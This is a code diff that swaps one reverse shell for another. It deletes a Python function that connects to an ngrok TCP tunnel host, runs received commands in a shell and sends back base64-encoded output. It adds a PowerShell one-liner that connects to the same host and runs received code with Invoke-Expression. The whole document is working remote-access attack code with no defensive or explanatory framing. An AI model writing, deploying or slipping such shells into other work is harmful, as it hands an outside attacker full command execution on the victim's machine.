@@ -1,15 +1,1 @@
-def connect_and_execute(ip, port):
-    import socket, base64, subprocess
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((ip, port))
-    s.send(b"[+] Connection established!\\n")
-    while True:
-        command = s.recv(1024)
-        if command.decode().strip().lower() == "exit":
-            break
-        result = subprocess.run(command.decode(), shell=True, capture_output=True)
-        s.send(base64.b64encode(result.stdout + result.stderr) + b"\\n")
-    s.close()
-
-# Получаем IP и порт
-connect_and_execute("2.tcp.eu.ngrok.io", 12190)
+$LHOST = "2.tcp.eu.ngrok.io"; $LPORT = 1219; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
